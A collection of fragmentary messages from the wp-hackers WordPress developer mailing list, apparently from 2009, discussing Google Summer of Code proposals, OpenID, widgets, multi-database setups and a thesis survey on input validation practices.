http://wordpress.org/extend/plugins/wordpress-bbpress-syncronization/
And here the bbPress:
http://bbpress.org/plugins/topic/wordpress-bbpress-syncronization/
Maybe it's not so useful for many people, but I can work on it.

So I also can participate in realization of any other idea. Please give me
advice what I must to do to join project

p.s.: really sorry for my poor English, I understand it much better than
write ;-)

Getting an option shouldn't cause a query if the autoload is set to
true (which I believe is the default), as the option would have
already been loaded in the initialization of WP.

That's the point Otto, if the option doesn't exist, it can't be auto 
loaded :) Quite a few plugin authors don't set the option until there's 
a change to the default settings, causing a query for a non existent 
option...

Subject: [wp-hackers] GSoC 2009 Ideas: Open ID integration with Wordpress

I'm still against OpenID in core for all the same reasons I've said
1000 times before. Nothing has changed there.

That said, making the core *easier* to integrate different
authentication systems is a very good idea. I'd like a simple plugin
to make OpenID work, to make Facebook Connect work, to make Google
Auth work, etc, etc. Currently, all the plugins to do this are
incredibly overcomplicated and annoying. Particularly so in the case
of OpenID, the implementations I've seen are, frankly, crap. No
offense to the authors intended, WordPress just makes it difficult to
change the authentication system.

There's changes in 2.8 to help this out, but I think a serious look at
it would find a good deal more stuff that could be easily abstracted
out.

On the other hand, any blog that requires me to register in order to
comment (using *any* means of authentication) is not only not getting
my comment, but not getting my readership either. So that's something
to keep in mind as well. It's the main reason I don't see this as a
pressing problem. I don't want to have to "join" a blog in order to
participate in the discussion there. That's a major benefit to a blog:
Discussion without the need for authentication. That's why many blogs
get readers in the first place.

Don't know how to fix this, but I submitted it to trac:
http://core.trac.wordpress.org/ticket/9404

If you want to display your wp_title(); in reverse order you can make
$seplocation equal 'right'.  However if you're displaying child pages,
$seplocation doesn't work correctly.

Current behavior: Parent -> Child -> Grandchild -> Blog Name

Subject: [wp-hackers] A portfolio/cv theme framework.
Message-ID: <e782e25c0903301619n62c9d94bv69f524328a6342a7@mail.gmail.com>

Hey everyone,

I've just finished the workload that came with my classes for the semester,
and decided it was time I had a look at my options for the GSoC. I was
really happy when I saw Wordpress was on the organization list because I've
started getting really involved with the CMS.

I thought that the theme framework idea was something that I could build on.
Wordpress is generally recognized as a *great* blogging tool, but little
people realize it's power past this. The fact that it has been adapted to
other purposes hints that the will is there to adapt it to other types of
web publishing.

Something else that is on the rise is a person's need to have a presence on
the web. More and more people are putting personal information on the web,
using their own websites as personal CVs or portfolios. I thought it might
be great if people could use wordpress' simple user interface to maintain an
online portfolio or resume. I think having a framework that is solid and
focuses on media manipulation (for images, videos, animations, etc), and
giving the design and feel personally to the user, while not troubling with
issues of displaying their work or experience, would be a great addition to
the collection of frameworks already out there.

This would also involve looking into the way media files are currently
handled, and ensuring it integrates nicely with the current system and
future additions.

Anyone have any thoughts on this?

Thanks,
Simon

Can you elaborate more with this media framework? My portfolio is currently
done using WP, http://www.blue-kaos.com, and whatever media I need is
already provided by youtube integration, image insertions, etc. Are you
talking about a simpler framework that can combine these all for easier
handling and optimized specifically towards CVs?

In short yes.

I was thinking of having a look at a way of making it easier for plugins
that work with video playing sites to be incorporated, as well as making it
easier to create an image gallery, slideshow, etc. Making sure a
CV/Portfolio framework is geared towards these types of insertions, and
making it easy, makes me think that it could be quite useful.

Like I said, the main idea behind making a framework for this type of site
is for people who want to maintain a site, but don't necessarily have the
savyness that most theme developers have. By giving them the tools to do so,
and optimizing those tools, they don't have to worry about these things.
Perhaps within the Wordpress panel, a simple GUI system that allows the user
to do some very simple manipulation of the css file without actually having
to dig into the css. Always leaving the css to be edited manually if the
user feels crafty.

What do you think?

Hi,

I am new to this mailing list, I have a little comment, I am thinking
of taking part in the Google Summer of Code 2009 program.
I read the ideas, which are posted on the codex. and I wrote my
proposal too, is there any place where I will be able to talk more
about this? I really like to talk about this, and to do some real work
for the WordPress.

any help is highly appreciated

Of course not: You can't use OpenID to login to the OpenID provider itself.

Hi,

Recently, while upgradation of our wordpress code base, from nightly 
build (released in 2006) and i tried a different approach to implement 
multi-db setup.  We had around 10,000 blogs in the old setup, with more 
than 1 lakh tables

In the current setup, the table variables in $wpdb is initialised to 
tables along with prefix.  I hacked that part of code, and in turn 
initialised these variables, along with DB name.  By this in all 
queries, the DB name will also be included along with the table name. 

I used the migration script of mutli-db plugin to split the tables in to 
different databases  (16 nos).

After implementing these changes all blogs were accessible fine, and we 
sent this code base to our testing team, and no major issues were 
reported.  We made sure, that all SQL queries uses $wpdb variables for 
the table names. Now the code is in production and running smooth.  The 
1 lakh tables is now split to around 5000 - 6000 tables to 17 different 
DB's .

Wanted to know your views on it.

Regards,
Senthil

I'm still in the process of writing my diploma thesis on the prevention of
web application security vulnerabilities and I'd like to know a bit
about the processes of your fine project, which is not obvious from
looking at the web page.

I now that these questions may not be of concern for all developers,
but I don't just want an answer from the project lead.

It would be great if you could take a couple
of minutes and think about the questions below. The questions are
mostly open-ended. Elaborate and skip questions at will. I'd like to
get answers the community at large can live with, not single opinions.
If vastly differing
opinions turn up on certain topics, I'd like to follow up on these.

Thank you very much in advance. I will provide you with a link to the
results of my thesis when it's done.

Florian

The questions:

About technical aspects:
- Are you using a web application framework? Which one?
- Do you use explicit data modeling for all business objects in the
  application?
- Do you have a specific layers for input/output validation/filtering?
  (If applicable) What does the input/output layer do (respectively)?
  How? Are you using external libraries? Why? Why not? (for HTML
  sanitation. object-relational mappers, database abstractions with
  prepared statements)?
- (If applicable) What responsibilities do the input/output layers
  have, respectively?
- How do you ensure that all input passed through validation/
  filtering? Do you have an API that must be used?
- Do you provide services to independently developed modules/
  components? Is there a defined API?
- Which other external libraries do you use?

About the development process:
- Is there public documentation about the responsibilities of the
  input/output layers?
- Is there public documentation about *when* input/output validation/
  filtering should happen? (Like: "output filtering must always happen
  in the method that renders the data")
- Do you have automatic tests for the whole system?

Bonus question:
- Do you do manual code review?

Hi Horatio,
This is something that we have previously thought about. We run multiple
WPMU installations, so being able to use an API to create users/blogs would
be very useful.

This kind of functionality might be useful for other WPMU users, so I
suggest that you open a Trac ticket (http://trac.mu.wordpress.org/) to see
if donncha (the main WPMU developer) would be willing to put such a feature
into the WPMU core.

James Collins

Subject: [wp-hackers] Widgets and a question related to a general roadmap of
	wordpress
Message-ID: <49D228A7.1070307@gmail.com>

Hi,

I would like to extend the widgets in such a way that a widget can be used
several times in sidebars. I have heard about plugins that allow this, but I
would like to offer a patch that could be incorporated in the WP core. Presuming
this is something that should become part of the WP core.

After searching around I noticed that some work is being done on the way widgets
work, but I cannot find a more general document / discussion around the goal for
the widgets. This brings me a more general question: Is there an actual
development (vision) roadmap for Wordpress available? The roadmap on
trac.wordpress.org seems to be focussed around bugs and not about a vision for
future WP versions.

All the best,

grtz

Message-ID: <1ec5f42c0903310842s668d9aeay8ee476eed340b7f8@mail.gmail.com>

Hi!

My name is Ninad Pundalik, and I am one of the many users interested
in applying for Google Summer of Code, 2009.  Kindly review this draft
and post your suggestions/improvements for this idea.

My aim is to work on improving the user experience for images in
Wordpress.  The idea has been suggested on the GSoC 2009 ideas page of
Wordpress as well as on this ideas page
http://wordpress.org/extend/ideas/topic.php?id=74, by LSabin.

I hope to do this by developing a plugin that implements most of the
functions as those found in this Organizer plugin
(http://imthi.com/organizer/), using JQuery and Imagemagick/GD,
alongwith PHP.  Hence, to summarize, I'll be implementing:

(1.) Image(s) upload
(2.) Image(s) resizing, thumbnailing and adding of watermarks
(3.) A directory and image management module that allows the user to
copy/rename/delete directories and images
(4.) Image(s) framing, montages, sketch generation using Imagemagick or GD
(5.) A module to create slideshows of images that can be added either
on the sidebar or as part of a post, using JQuery for the animations.
(6.) Change the filenames in the post when a file or directory has
been renamed (this functionality may not need to be coded from
scratch.  The Organizer plugin is very good at this)
(7.) Add support for multiple users and permissions, if time permits.

As the interface will be implemented using JQuery and AJAX, the user
will be provided with previews of the changes he is making, hence
improving the overall user experience. As a result, even a user with
minimal experience in processing images will be able to blog with
ease, without worrying too much about the nitty gritty of image
manipulation programs.Also, this will be a part of the Wordpress
interface, that he is so familiar with and comfortable in.
-------------------------------------------------------------

I do know that this mail is coming in quite late, but I was unable to
send this earlier.  I apologize for the delay.  This proposal has also
been documented on my blog ( http://ninadpundalik.co.cc/blog ).

MultiWidgets are already implemented in WP 2.8. See

You can either post some details from your proposal here and solicit
feedback from the group (probably your best option), or you can go on
#wordpress-dev on freenode and see if there's anyone around who wants
to talk "live" :)

I don't use the OpenID provided by wordpress.com (since I only use it  
for Akismet/Stats API Keys anyway and don't have a blog URL with the  
service). But this goes back to my point that there are a ton of  
providers but rarely any consumers.

There is a plugin available that would probably be a better way of
handling this (since it doesn't involve hacking the core code at all).

WordPress.com uses it, so it's known to handle millions of
users/blogs. Oh, and it has a really cool name :) HyperDB!

Hi People...

It's nice to see if anyone intersted in creating or willing to use API
facility to do admin task of WP remotly.
As bnabble said a REST framework will works well.
I'm currently working on a this kind of work for the GSOC 9
which is to manage admin functions,do synchronization and import/export..

It'll be created as a plugin...

So when you installed that plugin your WP instance have an REST based public
API...
So administration remotely can be archived.

Thanks scribu I missed that mail on the new Widget system. Great to see! Did I
also miss the roadmap and/or discussions? It's still not very clear to me how
the development process for these features like the Widgets go. Could someone
enlighten me?

All the best,

Good local time all.

Just a brief hello, I'm planning on applying to work for Wordpress as
part of Google Summer of Code 2009, specifically on the Media Block of
ideas (http://codex.wordpress.org/GSoC2009#Media) at the moment my
application is pretty open, I'd be interesting in hearing anything
anyone has to add, whilst I prepare my application.

My blog, albeit new-ish (been sat on it since December, not had time to
finish the style, its been hectic at uni since then) is at
http://barrycarlyon.co.uk/wordpress/

Thanks in advance

True. I think this is because it generally doesn't make any sense to
be an OpenID consumer, for a lot of cases. All it really adds is
complications.

I mean, what does being a consumer get you, as a programmer of a
webapp? Not much. You still have to store your own user data for that
user. If you didn't have any user data to store, then why bother
having them authenticate at all? Whereas being a provider gets you
quite a lot. If you've already got a user authentication system, then
becoming a provider is relatively straightforward. And now you know
what other services your users are using, if you care to know that
info (good stuff for marketing purposes).

The whole OpenID standard just strikes me as a solution in search of a
problem. Not the whole single-sign-on idea, that is still a problem.
But the need to tie your identity to a specific provider is still
there. You don't use usernames and passwords anymore, you need to use
a URL, which is a new and complex idea for a lot of folks. Etc, etc...

-Otto

While in general I agree, there is the standard case of "I just installed a plugin and I know I did, but now I have no idea where to configure it."  There is also the case of "I am looking at this site and trying to decide what functionality is core and what is a plugin so I can decide what I loose if I disable a given plugin."  So there are several different ways to look at it.

Thanks for the reply. This makes perfect sense, and is what I'd try to do, when available.

It's very good to know that there is a willingness to add, but that approach is not a panacea. Adding to a current project requires hacking the existing installation and hopes that the hack will be applied the same to future versions of WP. And there's the necessary time consuming political process of convincing people that there is a really such a need.

Also, there are likely to be a very large number of needs for a more specific filter and adding more and more hooks would cause serious bloat. Whatever the current list of available hooks is at best always a balance.  

What I was hoping for was a robust way to identify the current context so that there isn't a need to go adding more hooks all the time.
